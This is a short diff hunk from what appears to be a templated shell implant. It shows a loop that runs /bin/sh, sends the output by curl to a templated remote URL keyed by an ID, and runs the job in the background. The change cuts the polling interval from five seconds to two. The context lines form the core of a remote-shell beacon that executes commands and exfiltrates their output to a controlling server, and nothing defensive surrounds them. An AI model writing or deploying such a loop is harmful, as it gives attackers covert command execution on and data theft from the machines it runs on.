@@ -20,7 +20,7 @@ while :; do
                 /bin/sh 2>&1 |
                 curl {{- template "pinnedpubkey" . }} -T. -s -m 10 "{{ .URL }}/o/$ID"
         ) </dev/null &
-        sleep 5
+        sleep 2
 done
 
 _eof
